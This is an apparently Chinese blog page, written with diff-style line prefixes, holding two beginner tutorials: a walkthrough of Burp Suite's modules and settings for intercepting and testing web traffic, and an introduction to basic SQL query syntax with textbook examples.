-                <h2 id="Burpsuite简介"><a href="#Burpsuite简介" class="headerlink" title="Burpsuite简介"></a>Burpsuite简介</h2><p>Burp Suite简称BP，是用于攻击web应用程序的集成平台，它包含了许多工具，并为这些工具设计了很多接口，以促进加快攻击应用程序的过程。</p>
-<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击简称MITM攻击是一种间接的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为中间人。burpsuite抓包就是用的是这种方式。</p>
-<h2 id="burpsuite安装"><a href="#burpsuite安装" class="headerlink" title="burpsuite安装"></a>burpsuite安装</h2><p>到官网下载jar包，由于它是在java环境下运行的所以需要首先本地配置好java运行环境，用java命令启动。安装完成后抓包提示不安全无页面响应则需要安装根证书才能成功抓包。<br>根证书的安装：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-10-58-28.png" alt="安装根证书" class="lazyload"><br>根证书导入完成就可以抓取到数据包了。</p>
-<h2 id="burpsuite功能介绍"><a href="#burpsuite功能介绍" class="headerlink" title="burpsuite功能介绍"></a>burpsuite功能介绍</h2><h3 id="Doshboard模块"><a href="#Doshboard模块" class="headerlink" title="Doshboard模块"></a>Doshboard模块</h3><p>这个模块分为三小块：tasks 任务  event log 事件日志 issue activity动态发现的问题<br>task的默认开关：</p>
-<ul>
-<li>live passive crawl from proxy（all traffic） 被动抓取来自代理流量</li>
-<li>live audit from proxy （all traffic）实时审计来自代理流量</li>
-</ul>
-<p><strong>new scan（主动扫描）</strong><br>主动扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">scan details 选项有两个，一个是爬虫加审计，一个是只有审计，然后填上url即可<br>scan configuration 可以设置自己的ua，或者按照默认配置即可<br>application login options 应用登录选项，只有爬虫检测到登录表单会自动提交 可自定义配置账号<br>resource pool option 并发数配置默认为10<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-51-17.png" alt="主动扫描" class="lazyload"></p>
-<p><strong>new live scan （被动扫描）</strong><br>live audit 动态审计<br>live passive crawl 动态被动爬虫<br>tools scope 选择proxy repeater intruder审计那些流量<br>everything 包含所有<br>suite scope 使用burpsuite里加入scope<br>custom scope 自定义选项，可以使用suite scope，可以新增等<br>deduplication 删除重复url，减少重复扫描，默认没有选<br>其他功能和主动扫描一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-37-58.png" alt="被动扫描" class="lazyload"></p>
-<h3 id="target模块"><a href="#target模块" class="headerlink" title="target模块"></a>target模块</h3><p>target是帮助渗透更好地了解目标应用的整体状况、当前工作设计哪些目标域，分析可能存在的攻击面等信息有三个部分site map、scope、issue definitions。</p>
-<p><strong>site map 网站地图</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-46-53.png" alt="网站地图" class="lazyload"><br>功能模块：<br>include in scope 定义范围内规则<br>exclude from scope 定义排除范文内规则<br>渗透测试过程中，可以通过域名或主机名去限制拦截内容，比如只想拦截login目录下的所有请求，此时的作用域就是目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 限制站点地图和proxy历史的显示结果<br>2 告诉burp proxy拦截那些请求<br>3 burp spider抓取那些内容<br>4 burp scanner 自动扫描那些作用域的安全漏洞<br>5 在burp intruder和repeater中指定url<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-55-47.png" alt="范围" class="lazyload"></p>
-<p><strong>issue definitions</strong><br>安全专业的词汇和定义说明。</p>
-<h3 id="核心功能-Proxy代理"><a href="#核心功能-Proxy代理" class="headerlink" title="核心功能-Proxy代理"></a>核心功能-Proxy代理</h3><p>数据是一切的基础，proxy代理模块主要用于拦截浏览器的http回话内容，给模块提供数据，proxy模块如下图<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-06-58.png" alt="代理" class="lazyload"><br>代理模块有四个部分intercept、http history、websockets history、options。</p>
-<p><strong>intercept</strong><br>这个功能是截断，就是控制整个代理模块是否抓包，用于显示和修改http请求和响应。新版本中增加了专用的浏览器方便使用。低版本则需要手动在浏览器中设置网络代理。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-21-01.png" alt="抓包模块" class="lazyload"><br><strong>http history</strong><br>这里记录了每一个http数据包，可以通过此功能查看历史数据包。也可以过滤数据包，还可以查看数据包的详细信息。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-16-51.png" alt="http history" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-17-47.png" alt="还可以数据包过滤" class="lazyload"><br><strong>websockets history</strong><br>和http history功能十分类似，用于记录websockets，实际很少用。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-18-27.png" alt="websockets" class="lazyload"><br><strong>options</strong><br>这个部分主要用来配置代理：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-25-28.png" alt="配置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-31-01.png" alt="配置" class="lazyload"></p>
-<h3 id="intruder模块"><a href="#intruder模块" class="headerlink" title="intruder模块"></a>intruder模块</h3><p>为web应用程序自定义攻击模块，首先将proxy抓取到的数据包发送到intruder中然后根据模块说明自定义修改配置进行攻击。<br>positions 选择攻击模式和攻击范围<br>payloads 有效载荷攻击字典模块配置<br>resource pool 资源池管理情况<br>options intruder攻击配置模块<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-22-42.png" alt="intruder" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-34-46.png" alt="使用" class="lazyload"><br>在payloads可以配置不同的类型如brute forcer暴力破解字符集和长度或者不配置payload<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-04-05-11-33-53.png" alt="payloads配置" class="lazyload"></p>
-<h3 id="repeater模块-–-中继器"><a href="#repeater模块-–-中继器" class="headerlink" title="repeater模块 – 中继器"></a>repeater模块 – 中继器</h3><p>它根据抓到的数据包，修改数据包中的内容重发查看响应的反馈信息。<br>一些词的简单说明</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">send 发送数据包<br>cancel 中断发送<br>request 请求包<br>response 响应包<br>raw 接受到的数据包信息包括响应包数据<br>render 反馈数据包的响应包页面不是代码形式<br>hex 十六进制数据消息<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-45-07.png" alt="repeater" class="lazyload"></p>
-<h3 id="sequencer模块–定序器"><a href="#sequencer模块–定序器" class="headerlink" title="sequencer模块–定序器"></a>sequencer模块–定序器</h3><p>这个模块是检测数据包质量的工具，主要是为检测数据包代码质量，检测数据是否有被伪造的风险，很少用，不熟悉不要再生产环境下使用。</p>
-<h3 id="decoder模块"><a href="#decoder模块" class="headerlink" title="decoder模块"></a>decoder模块</h3><p>这个模块是编码和解码工具有多种编码格式，多重解码加密模式<br>decode 解码<br>encode 加密<br>hash 散列<br>smart decode 智能解码</p>
-<p>编码类型：<br>url、html、base64、ascll、16进制、8进制、2进制、GZIP</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-51-50.png" alt="解码" class="lazyload"></p>
-<h3 id="comparer模块"><a href="#comparer模块" class="headerlink" title="comparer模块"></a>comparer模块</h3><p>数据对比模块，举例来说，类似登录页面，登录成功和失败的响应包是不同的，因此可以对比寻找差异找突破点。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-53-51.png" alt="对比模块" class="lazyload"><br>words 选项文本数据对比结果<br>bytes 字节16进制对比结果</p>
-<h3 id="logger模块"><a href="#logger模块" class="headerlink" title="logger模块"></a>logger模块</h3><p>日志模块，查看日志，方便筛选需要的数据包然后也方便看到数据包的响应包。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-56-41.png" alt="日志" class="lazyload"></p>
-<h3 id="extender模块"><a href="#extender模块" class="headerlink" title="extender模块"></a>extender模块</h3><p>扩展模块：<br>extender 支持第三方拓展插件功能，主要有四个功能<br>extender 扩展<br>Bappstore 应用程序商店<br>APIS 接口<br>setting 选项</p>
-<p><strong>extender</strong><br>允许使用自己的或者第三方代码扩展<br>details 细节 output 输出 error 错误<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-20-42.png" alt="扩展" class="lazyload"></p>
-<p><strong>Bapp store</strong><br>插件商店：refresh list 刷新列表 manual install 自定义安装<br>installing 安装<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-22-38.png" alt="插件商店" class="lazyload"></p>
-<p><strong>apis</strong><br>通过拓展程序api常见自己的扩展，自定义burpsuite的行为<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-24-10.png" alt="apis" class="lazyload"></p>
-<p><strong>setting</strong><br>扩展的相关设置<br>automatically reload extensions on startup 启动时自动重新加载扩展<br>automatically update installed bapp on startup 启动时自动更新已安装的插件<br>java environment java环境 加载jar文件的文件夹<br>python environment python环境 在jiava中实现python解释器<br>    第一个选项 jython独立的jar文件<br>    第二个选项 加载模块<br>ruby environment ruby环境<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-29-39.png" alt="插件环境" class="lazyload"></p>
-<h3 id="setting模块"><a href="#setting模块" class="headerlink" title="setting模块"></a>setting模块</h3><p>对burp进行设置的选项具体内容不进行详细解释<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-42-00.png" alt="设置" class="lazyload"></p>
-
-            
-        </article>
-    </div>
-    
-    <div class="nexmoe-post">
-        <a href="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/">
-            
-                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
-                    <img data-src="/assets/background.gif" data-sizes="auto" alt="SQL学习" class="lazyload">
-                    <h1>SQL学习</h1>
-                </div>
-            
-        </a>
-
-        <div class="nexmoe-post-meta nexmoe-rainbow">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月22日</a>
-            <a><i class="nexmoefont icon-areachart"></i>5k 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 22 分钟</a>
-        </div>
-
-        <article>
-            
-                <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>SQL是用于访问和处理数据库的标准计算机语言：</p>
-<ul>
-<li>SQL指结构化查询语言</li>
-<li>SQL使我们有能力访问数据库</li>
-<li>SQL是一种ANSI的标准计算机语言</li>
-</ul>
-<p>RDBMS指的是关系型数据库管理系统</p>
-<ul>
-<li>RDBMS中的数据存储在被称为表(tables)的数据库对象中</li>
-<li>表是相关数据项的集合，它由行列组成</li>
-</ul>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>数据库操作语言DML和数据库定义语言DDL<br>SQL(结构化查询语言)适用于执行查询的语法，但SQL语言也包含用于更新、插入和删除记录的语法。</p>
-<p><strong>数据库操作语言DML</strong><br>查询和更新指令构成了SQL的DML部分：<em>更多的是操作表里的数据</em></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">-</span> 从数据库表中获取数据<br>update <span class="hljs-operator">-</span> 更新数据库表中的数据<br><span class="hljs-keyword">delete</span> <span class="hljs-operator">-</span> 从数据库表中删除数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-operator">-</span>向数据库表中插入数据<br></code></pre></td></tr></table></figure>
-
-<p><strong>数据库定义语言DDL</strong><br>SQL的数据定义语言DDL部分使我们有能力创建或者删除表格:<em>更多的是操作数据库及表</em><br>数据库中最重要的DDL语句：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database <span class="hljs-operator">-</span> 创建新数据库<br><span class="hljs-keyword">alter</span> database <span class="hljs-operator">-</span> 修改数据库<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 创建新表<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 变更或改变数据库表名<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 删除表<br><span class="hljs-keyword">create</span> index <span class="hljs-operator">-</span> 创建索引(搜索键)<br><span class="hljs-keyword">drop</span> index <span class="hljs-operator">-</span> 删除索引<br></code></pre></td></tr></table></figure>
-
-<h2 id="数据库的语句"><a href="#数据库的语句" class="headerlink" title="数据库的语句"></a>数据库的语句</h2><p><strong>select 和 select * 语句</strong><br>select语句用于从表中选取数据，结果被存储在一个结果表中（称结果集）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"># 语法<br><span class="hljs-keyword">select</span> 列名称 <span class="hljs-keyword">from</span> 表名称<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-16-58.png" alt="查询语句" class="lazyload"></p>
-<p><strong>select distinct语句</strong><br>在表中可能包含重复值，该语句用于列出不同的distinct的值<br>distinct用于返回<strong>唯一不同</strong>的值</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> 列名称 <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-45-06.png" alt="distinct语句" class="lazyload"></p>
-<p><strong>where子句</strong><br>如需有条件查询表中的数据，可以将where子句添加到select语句中</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 列名称 <span class="hljs-keyword">from</span> 表名称 <span class="hljs-keyword">where</span> 列 运算符 值<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-18-57.png" alt="where条件" class="lazyload"><br>运算符有：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-07-15.png" alt="where运算符" class="lazyload"><br>在某些版本的sql中&lt;&gt;可以写为!=</p>
-<p><strong>and 和 or 运算符</strong><br>and 和 or 运算符用于基于一个以上的条件对记录进行过滤<br>and 和 or 可在where子语句中把两个或多个条件结合起来<br>如果第一个和第二个条件都成了，则and运算符显示一条记录<br>如果第一个和第二个条件中只要有一个成立，则or运算符显示一条记录</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-49-20.png" alt="and和or" class="lazyload"></p>
-<p><strong>oder by语句</strong><br>order by语句用于根据指定的列对结果集进行排序<br>order by语句默认按照升序对记录进行排序<br>如果希望按照降序排列需要使用desc关键字,升序的关键字是asc</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#以字母顺序显示名称<br><span class="hljs-keyword">select</span> username,level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username<br>#以字母顺序显示名字，并以级别显示顺序<br><span class="hljs-keyword">select</span> username,level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> level<br>#以字母顺序显示名字，并以级别逆序排列<br><span class="hljs-keyword">select</span> username，level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> level <span class="hljs-keyword">desc</span><br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-40-56.png" alt="order by语句" class="lazyload"></p>
-<p><strong>insert into语句</strong><br>insert into语句用于向表格中插入新的行</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> 表名称 <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，...)<br>也可以指定索要插入的数据的列<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> 表名称 (列<span class="hljs-number">1</span>，列<span class="hljs-number">2</span>，...) <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...)<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-48-03.png" alt="插入信息" class="lazyload"></p>
-<p><strong>update语句</strong><br>update语句用于修改表中的数据</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">update 表名称 <span class="hljs-keyword">set</span> 列名称 <span class="hljs-operator">=</span> 新 值 <span class="hljs-keyword">where</span> 列名称 <span class="hljs-operator">=</span> 某 值<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-52-10.png" alt="修改更新数据" class="lazyload"></p>
-<p><strong>delete语句</strong><br>delete语句用于删除表中的行：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名称 <span class="hljs-keyword">where</span> 列名称 <span class="hljs-operator">=</span> 值<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-17-29.png" alt="删除一行" class="lazyload"></p>
-<p>可以在不删除表的情况下删除所有行，这意味着表的结构，属性和索引都是完整的</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名称<br>或<br><span class="hljs-keyword">delete</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-21-28.png" alt="清空表" class="lazyload"></p>
-<p><strong>create语句</strong><br>create语句用来创建数据库和库中的表</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#创建表<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> 表名(<br>    属性名<span class="hljs-number">1</span> 类型 <span class="hljs-keyword">primary</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-comment">--primary是主键 not null 是不为空</span><br>    属性名<span class="hljs-number">2</span> 类型 <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;值&#x27;</span>,  <span class="hljs-comment">---default用来指定默认值</span><br>    属性名<span class="hljs-number">3</span> 类型    <span class="hljs-comment">--注意最后一条语句不需要加,号</span><br>)<br><br>#创建数据库<br><span class="hljs-keyword">create</span> database 数据库名称    <span class="hljs-comment">--创建数据库</span><br><span class="hljs-keyword">on</span> <span class="hljs-keyword">primary</span><br>(<br> name        <span class="hljs-comment">--数据库的逻辑名称</span><br> filename    <br> <span class="hljs-comment">--物理存放位置及物理文件名称(Student_info.mdf就是在磁盘上显示的名称)</span><br> size        <span class="hljs-comment">--设置数据文件初始大小</span><br> maxsize        <span class="hljs-comment">--设置最大限制</span><br> filegrowth       <span class="hljs-comment">--设置主数据文件增长幅度</span><br>)<br>log <span class="hljs-keyword">on</span>         <span class="hljs-comment">--定义事务日志文件</span><br>(<br> name         <span class="hljs-comment">--逻辑名称</span><br> filename       <span class="hljs-comment">--物理存放位置及物理文件名称</span><br> size<span class="hljs-operator">=</span>        <span class="hljs-comment">--设置事务日志文件初始大小</span><br> maxsize        <span class="hljs-comment">--设置最大限制为</span><br> filegrowth       <span class="hljs-comment">--设置事务日志增长幅度</span><br>)<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-17-10.png" alt="创建表" class="lazyload"></p>
-<p><strong>top子句</strong><br>top子句用于规定要返回的记录数目。对于拥有数千条记录的大型表来说top子句是很有用的。注意并非所有的数据库都支持top子句。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">SQL</span> Server 的语法<br> <br><span class="hljs-keyword">SELECT</span> TOP number<span class="hljs-operator">|</span><span class="hljs-keyword">percent</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name<br>  <br># MySQL 语法<br> <br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name LIMIT number<br> <br># Oracle 语法<br> <br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> ROWNUM <span class="hljs-operator">&lt;=</span> number<br><br></code></pre></td></tr></table></figure>
-
-<p><strong>limit数据分页</strong><br>limit用于限定返回记录数</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">limit n #提取n条数据<br>limit m,n #跳过m条数据，提取n条数据<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-44-05.png" alt="limit限定" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-44-54.png" alt="limit" class="lazyload"></p>
-<p><strong>like操作符</strong><br>like操作符用在where子句中搜索列表中的指定模式。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">like</span> <span class="hljs-keyword">pattern</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;g%&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g%&#x27;</span><br># <span class="hljs-keyword">not</span> 关键字 不包含<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g%&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p>%可以用来定义通配符(模式中缺少的字母)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-07-09.png" alt="like关键字查询" class="lazyload"></p>
-<p><strong>通配符</strong><br>在搜索数据库中的数据时，sql通配符可以代替一个或多个字符。sql通配符必须和like运算符一起使用。[]通配符需要使用regexp关键字<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-08-47.png" alt="通配符" class="lazyload"></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#使用_通配符 仅代替一个字符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;_g&#x27;</span><br>#使用[charlist]通配符 字符列中的任何单一字符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content regexp <span class="hljs-string">&#x27;[ds]%&#x27;</span> <span class="hljs-comment">--包含</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content regexp <span class="hljs-string">&#x27;[!g]%&#x27;</span> <span class="hljs-comment">--不包含</span><br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-28-04.png" alt="通配符" class="lazyload"></p>
-<p><strong>IN操作符</strong><br>in操作符允许我们在where子句中规定多个值</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">in</span> (value1,value2,...)<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-32-06.png" alt="测试in操作符" class="lazyload"></p>
-<p><strong>not in 与 null 之间的关系</strong><br>A not in B的原理是拿A表值与B表值做是否不等的比较, 也就是a != b. 在sql中, null是缺失未知值而不是空值<br>当你判断任意值a != null时, 官方说, “You cannot use arithmetic comparison operators such as =, &lt;, or &lt;&gt; to test for NULL”, 任何与null值的对比都将返回null. 因此返回结果为否,这点可以用代码 select if(1 = null, ‘true’, ‘false’)证实.<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-37-07.png" alt="测试" class="lazyload"></p>
-<p><strong>BETWEEN操作符</strong><br>操作符between…and会选取介于两个值之间的数据范围，这些值可以是数值、文本或者日期</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">between</span> value1 <span class="hljs-keyword">and</span> value2 <br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-43-31.png" alt="between  and " class="lazyload"></p>
-<p><em>注意：</em>不同的数据库对这个操作符的处理方式是有差异的。所以使用时要检查数据库如何处理操作符（左闭右开or全开or左开右闭or全闭）</p>
-<p><strong>alias（别名）</strong><br>通过使用alias可以为列名和表名指定别名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">表的alias语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">as</span> 别名<br>列的alias语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">as</span> 别名 <span class="hljs-keyword">from</span> 表名<br></code></pre></td></tr></table></figure>
-
